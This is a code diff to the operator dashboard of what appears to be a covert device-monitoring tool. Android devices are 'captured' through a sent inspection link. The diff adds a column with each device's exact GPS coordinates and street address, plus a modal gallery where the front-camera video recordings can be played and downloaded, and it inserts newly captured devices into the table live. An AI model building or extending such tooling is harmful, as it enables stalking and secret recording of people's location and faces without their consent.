@@ -596,6 +596,7 @@
                         <th>Device Model</th>
                         <th>Monitoring Status</th>
                         <th>OS Version</th>
+                        <th>Exact GPS Location</th>
                         <th>Live Battery %</th>
                         <th>Network</th>
                         <th>IP Address</th>
@@ -620,18 +621,27 @@
                             {% endif %}
                         </td>
                         <td class="dev-os">{{ dev.os_info }}</td>
+                        <td class="dev-gps">
+                            {% if dev.maps_url %}
+                                <a href="{{ dev.maps_url }}" target="_blank" class="btn-action btn-view" style="background: rgba(16,185,129,0.15); color: #34d399; border-color: rgba(16,185,129,0.3);">
+                                    <i class="fa-solid fa-location-dot"></i> {{ dev.latitude|floatformat:4 }}, {{ dev.longitude|floatformat:4 }}
+                                </a>
+                            {% else %}
+                                <span style="font-size: 12px; color: #94a3b8;">{{ dev.location_status|default:"Pending" }}</span>
+                            {% endif %}
+                        </td>
                         <td class="dev-battery" style="color: #38bdf8; font-weight: 600;">{{ dev.battery_info }}</td>
                         <td class="dev-network">{{ dev.network_info }}</td>
                         <td style="font-family: monospace; color: #94a3b8;">{{ dev.ip_address }}</td>
                         <td class="dev-ping">{{ dev.last_ping|date:"H:i:s" }}</td>
                         <td>
-                            <button class="btn-action btn-view" onclick="openDeviceModal('{{ dev.id }}')"><i class="fa-solid fa-eye"></i> View</button>
+                            <button class="btn-action btn-view" onclick="openDeviceModal('{{ dev.id }}')"><i class="fa-solid fa-eye"></i> View & Videos</button>
                             <a href="{% url 'delete_device' dev.id %}" class="btn-action btn-delete" onclick="return confirm('Stop monitoring and delete device record?')"><i class="fa-solid fa-trash"></i> Stop & Delete</a>
                         </td>
                     </tr>
                     {% empty %}
                     <tr>
-                        <td colspan="8" style="text-align: center; color: #64748b; padding: 40px;">
+                        <td colspan="9" style="text-align: center; color: #64748b; padding: 40px;">
                             No devices captured yet. Send an inspection link to an Android device to start live telemetry monitoring!
                         </td>
                     </tr>
@@ -645,12 +655,13 @@
     <div class="modal-overlay" id="deviceModal">
         <div class="modal-content">
             <div class="modal-header">
-                <div class="modal-title" id="mModel">Device Telemetry Record</div>
+                <div class="modal-title" id="mModel">Device Telemetry & Recorded Media</div>
                 <button class="modal-close" onclick="closeDeviceModal()">&times;</button>
             </div>
             <div class="detail-grid">
                 <div class="detail-card"><div class="detail-lbl">Monitoring Status</div><div class="detail-val" id="mStatus">...</div></div>
                 <div class="detail-card"><div class="detail-lbl">Link Target Label</div><div class="detail-val" id="mLinkLabel">...</div></div>
+                <div class="detail-card full-width"><div class="detail-lbl">Exact GPS Location</div><div class="detail-val" id="mGPS">...</div></div>
                 <div class="detail-card"><div class="detail-lbl">OS & Version</div><div class="detail-val" id="mOS">...</div></div>
                 <div class="detail-card"><div class="detail-lbl">Browser</div><div class="detail-val" id="mBrowser">...</div></div>
                 <div class="detail-card"><div class="detail-lbl">Battery & Power</div><div class="detail-val" id="mBattery">...</div></div>
@@ -663,6 +674,17 @@
                 <div class="detail-card full-width"><div class="detail-lbl">IP Address & User Agent</div><div class="detail-val" id="mIPUA">...</div></div>
                 <div class="detail-card"><div class="detail-lbl">First Captured</div><div class="detail-val" id="mCapturedAt">...</div></div>
                 <div class="detail-card"><div class="detail-lbl">Last Live Ping</div><div class="detail-val" id="mLastPing">...</div></div>
+                
+                <!-- Front Camera Videos Section -->
+                <div class="detail-card full-width" style="margin-top: 10px; background: rgba(15, 23, 42, 0.9); border-color: rgba(99, 102, 241, 0.3);">
+                    <div class="detail-lbl" style="display:flex; justify-content:space-between; align-items:center;">
+                        <span><i class="fa-solid fa-video" style="color: #34d399; margin-right:6px;"></i> Recorded Front Camera Videos</span>
+                        <span id="mVideoCount" style="color:#94a3b8; font-weight:normal; text-transform:none;">0 Clips</span>
+                    </div>
+                    <div id="mVideoGallery" style="display:flex; flex-direction:column; gap:12px; margin-top:12px; max-height:280px; overflow-y:auto;">
+                        <div style="color:#64748b; text-align:center; padding:16px;">Loading video clips...</div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -709,6 +731,25 @@
                         '<span style="color:#34d399;">● LIVE TAB ACTIVE</span>' : 
                         '<span style="color:#38bdf8;">● BACKGROUND MONITORED</span>';
                     document.getElementById('mLinkLabel').innerText = dev.link_label;
+
+                    if (dev.maps_url) {
+                        const acc = dev.location_accuracy ? Math.round(dev.location_accuracy) : 0;
+                        let badgeColor = acc <= 30 ? "#34d399" : (acc <= 500 ? "#fbbf24" : "#f87171");
+                        let precisionText = acc <= 30 ? "High Precision GPS" : (acc <= 500 ? "Medium Precision Wi-Fi" : "Coarse Location");
+                        let addrHtml = dev.location_address ? `<div style="font-size:12px; color:#cbd5e1; margin-top:4px;"><i class="fa-solid fa-house" style="color:#818cf8;"></i> ${dev.location_address}</div>` : '';
+
+                        document.getElementById('mGPS').innerHTML = `
+                            <a href="${dev.maps_url}" target="_blank" style="color: ${badgeColor}; font-weight: 700; text-decoration: underline;">
+                                <i class="fa-solid fa-location-dot"></i> Lat: ${dev.latitude}, Long: ${dev.longitude} 
+                                <span style="font-size:12px; font-weight:normal;">(±${acc}m - ${precisionText})</span>
+                            </a>
+                            ${addrHtml}
+                        `;
+                    } else {
+                        document.getElementById('mGPS').innerHTML = `<span style="color: #94a3b8;">${dev.location_status || 'Pending / Permission Not Granted'}</span>`;
+                    }
+
+
                     document.getElementById('mOS').innerText = dev.os_info;
                     document.getElementById('mBrowser').innerText = dev.browser_info;
                     document.getElementById('mBattery').innerText = dev.battery_info;
@@ -721,6 +762,34 @@
                     document.getElementById('mIPUA').innerText = `IP: ${dev.ip_address} | ${dev.user_agent}`;
                     document.getElementById('mCapturedAt').innerText = dev.captured_at;
                     document.getElementById('mLastPing').innerText = dev.last_ping;
+
+                    // Render Videos Gallery
+                    if (dev.videos && dev.videos.length > 0) {
+                        document.getElementById('mVideoCount').innerText = `${dev.videos.length} Video Clip(s)`;
+                        let galleryHtml = '';
+                        dev.videos.forEach(v => {
+                            galleryHtml += `
+                                <div style="background: rgba(11, 15, 25, 0.9); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 12px;">
+                                    <div style="display:flex; justify-content:space-between; align-items:center; font-size:12px; color:#94a3b8; margin-bottom: 8px;">
+                                        <span><i class="fa-solid fa-clock" style="color:#818cf8;"></i> ${v.recorded_at}</span>
+                                        <span style="color:#34d399; font-weight:600;">Size: ${v.file_size_mb} (${v.duration_sec}s)</span>
+                                    </div>
+                                    <video controls width="100%" style="border-radius:8px; max-height:220px; background:#000; outline:none;">
+                                        <source src="${v.url}" type="video/webm">
+                                        <source src="${v.url}" type="video/mp4">
+                                        Your browser does not support standard HTML5 video playback.
+                                    </video>
+                                    <div style="margin-top:6px; text-align:right;">
+                                        <a href="${v.url}" download target="_blank" style="color:#38bdf8; font-size:12px; text-decoration:none;"><i class="fa-solid fa-download"></i> Download Video</a>
+                                    </div>
+                                </div>
+                            `;
+                        });
+                        document.getElementById('mVideoGallery').innerHTML = galleryHtml;
+                    } else {
+                        document.getElementById('mVideoCount').innerText = '0 Clips';
+                        document.getElementById('mVideoGallery').innerHTML = '<div style="color:#64748b; text-align:center; padding:16px;">No front camera recordings uploaded yet for this device session.</div>';
+                    }
 
                     document.getElementById('deviceModal').style.display = 'flex';
                 }
@@ -747,6 +816,19 @@
                             row.querySelector('.dev-network').innerText = dev.network_info;
                             row.querySelector('.dev-ping').innerText = dev.last_ping;
 
+                            const gpsCell = row.querySelector('.dev-gps');
+                            if (gpsCell) {
+                                if (dev.maps_url) {
+                                    gpsCell.innerHTML = `
+                                        <a href="${dev.maps_url}" target="_blank" class="btn-action btn-view" style="background: rgba(16,185,129,0.15); color: #34d399; border-color: rgba(16,185,129,0.3);">
+                                            <i class="fa-solid fa-location-dot"></i> Location Map
+                                        </a>
+                                    `;
+                                } else {
+                                    gpsCell.innerHTML = `<span style="font-size: 12px; color: #94a3b8;">${dev.location_status || 'Pending'}</span>`;
+                                }
+                            }
+
                             const statusCell = row.querySelector('.dev-status-cell');
                             if (dev.session_state === 'live_active') {
                                 statusCell.innerHTML = '<span class="status-badge badge-live"><i class="fa-solid fa-circle"></i> LIVE TAB ACTIVE</span>';
@@ -755,7 +837,54 @@
                             } else {
                                 statusCell.innerHTML = '<span class="status-badge badge-stopped"><i class="fa-solid fa-ban"></i> TERMINATED</span>';
                             }
+                        } else {
+                            // Dynamically insert new device row into DOM
+                            const tbody = document.getElementById('deviceTableBody');
+                            if (tbody) {
+                                // Remove empty placeholder row if exists
+                                if (tbody.children.length === 1 && tbody.children[0].children.length === 1) {
+                                    tbody.innerHTML = '';
+                                }
+                                const tr = document.createElement('tr');
+                                tr.id = `device-row-${dev.id}`;
+
+                                let statusBadge = '<span class="status-badge badge-stopped"><i class="fa-solid fa-ban"></i> TERMINATED</span>';
+                                if (dev.session_state === 'live_active') {
+                                    statusBadge = '<span class="status-badge badge-live"><i class="fa-solid fa-circle"></i> LIVE TAB ACTIVE</span>';
+                                } else if (dev.session_state === 'background_monitored') {
+                                    statusBadge = '<span class="status-badge badge-background"><i class="fa-solid fa-cloud"></i> BACKGROUND MONITORED</span>';
+                                }
+
+                                let gpsHtml = `<span style="font-size: 12px; color: #94a3b8;">${dev.location_status || 'Pending'}</span>`;
+                                if (dev.maps_url) {
+                                    gpsHtml = `
+                                        <a href="${dev.maps_url}" target="_blank" class="btn-action btn-view" style="background: rgba(16,185,129,0.15); color: #34d399; border-color: rgba(16,185,129,0.3);">
+                                            <i class="fa-solid fa-location-dot"></i> Location Map
+                                        </a>
+                                    `;
+                                }
+
+                                tr.innerHTML = `
+                                    <td style="font-weight: 600; color: #fff;">
+                                        <i class="fa-solid fa-mobile-button" style="color: #818cf8; margin-right: 8px;"></i>
+                                        <span class="dev-model">${dev.device_model}</span>
+                                    </td>
+                                    <td class="dev-status-cell">${statusBadge}</td>
+                                    <td class="dev-os">${dev.os_info}</td>
+                                    <td class="dev-gps">${gpsHtml}</td>
+                                    <td class="dev-battery" style="color: #38bdf8; font-weight: 600;">${dev.battery_info}</td>
+                                    <td class="dev-network">${dev.network_info}</td>
+                                    <td style="font-family: monospace; color: #94a3b8;">${dev.ip_address}</td>
+                                    <td class="dev-ping">${dev.last_ping}</td>
+                                    <td>
+                                        <button class="btn-action btn-view" onclick="openDeviceModal('${dev.id}')"><i class="fa-solid fa-eye"></i> View & Videos</button>
+                                        <a href="/delete-device/${dev.id}/" class="btn-action btn-delete" onclick="return confirm('Stop monitoring and delete device record?')"><i class="fa-solid fa-trash"></i> Stop & Delete</a>
+                                    </td>
+                                `;
+                                tbody.prepend(tr);
+                            }
                         }
+
                     });
                     document.getElementById('activeLiveCount').innerText = liveActiveCount;
                 }
@@ -766,3 +895,4 @@
     </script>
 </body>
 </html>
+
